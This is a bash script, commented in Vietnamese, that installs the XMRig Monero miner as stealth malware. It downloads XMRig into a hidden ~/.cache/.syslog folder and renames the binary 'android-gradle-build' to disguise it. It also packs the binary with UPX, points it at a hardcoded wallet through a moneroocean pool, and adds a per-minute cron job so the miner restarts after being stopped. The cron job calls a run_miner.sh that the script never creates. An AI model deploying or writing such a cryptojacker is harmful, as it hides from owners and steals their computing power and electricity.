#!/bin/bash

# ==== Cấu hình chung ====
POOL_REAL="gulf.moneroocean.stream:10128"
POOL_LOCAL="127.0.0.1:8888"
WALLET="84UznXHBqkhUcsDt7uJGLgMcfZSSfWbkyLgNPoX5TAKk63p9WNwZacNAto4qUJSz1b3pikEWcRwrZ5ZfsSD5iZSK4aHmY6Z"  # 👈 ĐỔI ví tại đây
CPU_PERCENT=90
INSTALL_DIR="$HOME/.cache/.syslog"
RIG_NAME=$(hostname)
PROCESS_NAME="android-gradle-build"
SESSION_NAME="android_build"

# ==== Chuẩn bị ====
sudo apt update -y
sudo apt install -y curl tar upx-ucl tmux socat cpulimit >/dev/null

# ==== Tự động cấp HugePages ====
CORES=$(nproc)
HUGEPAGES=$((CORES * 512))  # Theo yêu cầu: 512 HugePages mỗi core
echo "[*] Phát hiện $CORES core, cấp $HUGEPAGES HugePages (~$(($HUGEPAGES * 2 / 1024)) GB RAM)"
sudo sysctl -w vm.nr_hugepages=$HUGEPAGES >/dev/null

# ==== Tạo thư mục ẩn và di chuyển vào ====
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR" || exit 1

# ==== Tải và giải nén XMRig ====
curl -L -o sys.tar.gz "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz"
tar -xvzf sys.tar.gz --strip=1 >/dev/null
rm -f sys.tar.gz

# ==== Đổi tên, nén, cấp quyền ====
mv xmrig "$PROCESS_NAME"
chmod +x "$PROCESS_NAME"
upx --best --lzma "$PROCESS_NAME" >/dev/null 2>&1

MAX_THREADS_HINT=$(awk "BEGIN { print $CPU_PERCENT / 100 }")

cat > .cfg.json <<EOF
{
  "autosave": true,
  "cpu": {
    "enabled": true,
    "huge-pages": true,
    "yield": true,
    "max-threads-hint": $MAX_THREADS_HINT
  },
  "background": false,
  "pools": [
    {
      "url": "$POOL_LOCAL",
      "user": "$WALLET",
      "pass": "$RIG_NAME",
      "tls": false,
      "keepalive": true
    }
  ]
}
EOF

# ==== Tạo proxy từ port 80 sang pool TLS ====
#tmux has-session -t proxy 2>/dev/null || \
#tmux new-session -d -s proxy "sudo socat TCP-LISTEN:8888,reuseaddr,fork TCP:$POOL_REAL"

# ==== Tạo script khởi chạy ngụy trang với giới hạn CPU ====
tmux has-session -t journald 2>/dev/null || tmux new-session -d -s android_build "cd ~/.cache/.syslog && ./android-gradle-build -c .cfg.json"


# ==== Tạo cron job để tự khôi phục ====
(crontab -l 2>/dev/null; echo "* * * * * pgrep -f $PROCESS_NAME > /dev/null || (cd $INSTALL_DIR && tmux new-session -d -s $SESSION_NAME '$INSTALL_DIR/run_miner.sh')") | crontab -

# ==== Hoàn tất ====
echo "✅ Đào XMR stealth hoàn tất"
echo "📁 Đang chạy tại: $INSTALL_DIR"
echo "🕵️ Tiến trình: $PROCESS_NAME | tmux: $SESSION_NAME"
echo "🧠 Cấu hình HugePages: $HUGEPAGES page (~$(($HUGEPAGES * 2 / 1024)) GB)"
